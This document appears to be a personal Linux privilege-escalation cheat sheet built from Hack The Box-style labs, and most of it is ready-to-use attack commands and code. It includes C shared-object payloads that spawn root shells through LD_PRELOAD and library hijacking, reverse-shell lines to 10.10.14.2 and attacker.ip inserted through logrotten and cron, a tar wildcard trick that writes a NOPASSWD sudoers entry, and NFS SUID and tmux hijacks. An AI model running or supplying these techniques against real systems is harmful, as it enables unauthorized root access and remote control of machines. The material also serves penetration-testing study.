#linux/LPE
# Enumeration
* `hostname`
* `uname -a`
* `cat /proc/version`
* `cat /etc/issue`
* `ps -A`
* `ps axjf` - tree view
* `ps aux` - all processes
* `env`
* `id <username>`
* `cat /etc/passwd` - list of users
* `cat /etc/shadow` - password hashes
	   * Detect hash type in `/etc/shadow` using `grep ENCRYPT_METHOD /etc/login.defs`
* `history`
* `ifconfig`
* `ip route`
* `netstat -a` - all open ports, `netstat -at` or `netstat -au` - tcp/udp, `nestat -l` - listening mode
* `netstat -tp`: list connections with the service name and PID information
* `netstat -tulpn | grep LISTEN` 
* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit
* `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` SUID
* `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` SGID
* `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student` - file all hidden files
* `find / -type d -name ".*" -ls 2>/dev/null` - all hidden dirs
* `ls -l /tmp /var/tmp /dev/shm` - tmp files
* Installed packages
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
* configs
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
* scripts
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
# Traffic interception
https://github.com/DanMcInerney/net-creds
https://github.com/lgandx/PCredz
# Sudo and LD Preload
Check shared libraries required by a binary:
```bash
ldd /bin/ls
```
First we need a user with sudo privileges.
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
	unsetenv("LD_PRELOAD");  
	setgid(0);  
	setuid(0);  
	system("/bin/bash");  
}
```
Compile
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
# Hijacking Shared Libraries
Identify cusotm shared libs:
```shell
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
Find out allowed directory to load libs from:
```bash
readelf -d payroll  | grep PATH

0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Check dir permissions:
```bash
ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```
Detect function that used by binary:
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
cat src.c
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```

# Hijacking python libraries
## Wrong write permissions
We have a script with SUID permissions. 
It uses psutil module and virtual_memory function:
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```
Modify function and run script
```bash
/usr/bin/python3 ./mem_status.py
```
## Library Path
PYPTHONPATH listing
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```
Check if we have write permissions to any library path
Default installation location
```bash
pip3 show psutil
```
## PYTHONPATH Environment Variable
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
# Polkit
```bash
ls /usr/share/polkit-1/actions/
ls /usr/share/polkit-1/rules.d
```
https://github.com/arthepsy/CVE-2021-4034
# Logrotate
https://github.com/whotwagner/logrotten
1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
```bash
git clone https://github.com/whotwagner/logrotten.git && cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create

./logrotten -p ./payload /tmp/tmp.log
# waiting for running logrotate
```

# Cron
1. `cat /etc/crontab`
2. Modify available cron script and add your code there: 
```bash
bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
```
3. Listen on attacker machine: `nc -nlvp 6666`
## psspy
Spy on running process to find passed function arguments like passwords
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```bash
./pspy64 -pf -i 1000
```
# Misc
##### Groups
adm
Members of the adm group are able to read all logs stored in /var/log. 

Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1,


##### Wildcard abuse
tar exampl
```bash
# crontab
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
# abusing
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

##### Restricted shell
https://vk9-sec.com/linux-restricted-shell-bypass/
```bash
ssh htb-user@10.129.205.109 -t "bash --noprofile"
```
##### Automated tools
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
	* `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
#### Kernel exploits
* https://github.com/The-Z-Labs/linux-exploit-suggester
* https://www.cvedetails.com/
* https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
#### sudo
* run `sudo -l`
* Check binaries at https://gtfobins.github.io/

#### SUID
1. c will list files that have SUID or SGID bits set.
2. Check gtfobins
#### Capabilities
1. `getcap -r / 2>/dev/null`
2. Check gtfobins
#### [[NFS]]
List mountable devices `cat /etc/exports`

On attacker machine: 
`showmount -e <ip>`
`mount -o rw <ip>:/backups /tmp/bd`

If no_root_squash option is set on mountable device, we can use SUID.
Create executable with SUID set and run on attacker machine:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```
build
```bash
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```
## Hijacking Tmux Sessions
```bash
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
htb@NIX02:~$  ps aux | grep tmux
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess

htb@NIX02:~$ ls -la /shareds 
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

htb@NIX02:~$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

htb@NIX02:~$ tmux -S /shareds
id
uid=0(root) gid=0(root) groups=0(root)
```
## Local ports
Show ports in use:
```bash
ss -tnl

ss -tunlp 
```
Display default service for each port in use:
```bash
ss -tl
```
Discover open ports and services:
```shell
netstat -tulpn | grep LISTEN
```
## Case 1. Bash
```bash
if [[ $DB_PASS == $USER_PASS ]]; then
	/usr/bin/echo "Password confirmed!"
else
	/usr/bin/echo "Password confirmation failed!"
exit 1
fi
```
This is due to the use of == inside [[ ]] in Bash , which performs pattern matching rather than
a direct string comparison; more on this can be found https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29
## Case 2. tar unarchive wildcard
https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com

# Hardening
audit
https://github.com/CISOfy/lynis